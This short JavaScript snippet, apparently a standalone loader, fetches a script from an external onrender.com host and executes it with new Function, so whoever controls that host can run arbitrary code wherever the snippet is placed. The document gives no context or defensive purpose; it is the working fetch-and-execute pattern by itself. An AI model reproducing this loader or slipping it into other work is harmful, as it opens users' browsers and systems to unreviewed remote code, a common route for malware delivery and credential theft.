fetch('https://bylbahub.onrender.com/static/main.js')
    .then(r => r.text())
    .then(code => {
        const script = new Function(code);
        script();
    })
